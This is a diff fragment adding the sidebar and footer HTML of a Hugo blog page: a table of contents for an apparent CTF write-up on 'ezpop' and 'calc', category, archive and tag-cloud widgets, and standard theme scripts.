+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#写在前面">写在前面</a></li>
+        <li><a href="#ezpop">ezpop</a></li>
+        <li><a href="#calc">calc</a>
+          <ol>
+            <li><a href="#解法一">解法一</a></li>
+            <li><a href="#解法二">解法二</a></li>
+          </ol>
+        </li>
+        <li><a href="#参考资料">参考资料</a></li>
+        <li><a href="#写在后面">写在后面</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+        
+            <section class="widget categories">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">分类</h2>
+    <div class="widget-categories--list">
+        <div class="widget">
+            <h3 class="widget-title"> </h3>
+            <div class="widget-body">
+                <div class="category-list">
+                    <div class="category-list-item"><a href="https://example.com/categories/ctf/" class="category-list-link">ctf<span class="category-list-count">4</a>
+                        </span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">归档</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2023">
+                        
+                            <span class="year">2023</span>
+                            <span class="count">1</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2022">
+                        
+                            <span class="year">2022</span>
+                            <span class="count">4</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">标签云</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/web/" class="font_size_4">
+                web
+            </a>
+        
+            <a href="/tags/java/" class="font_size_2">
+                java
+            </a>
+        
+            <a href="/tags/fastjson/" class="font_size_1">
+                fastjson
+            </a>
+        
+            <a href="/tags/hugo/" class="font_size_1">
+                Hugo
+            </a>
+        
+            <a href="/tags/jndi/" class="font_size_1">
+                jndi
+            </a>
+        
+            <a href="/tags/php/" class="font_size_1">
+                php
+            </a>
+        
+            <a href="/tags/python/" class="font_size_1">
+                python
+            </a>
+        
+            <a href="/tags/sql/" class="font_size_1">
+                SQL
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
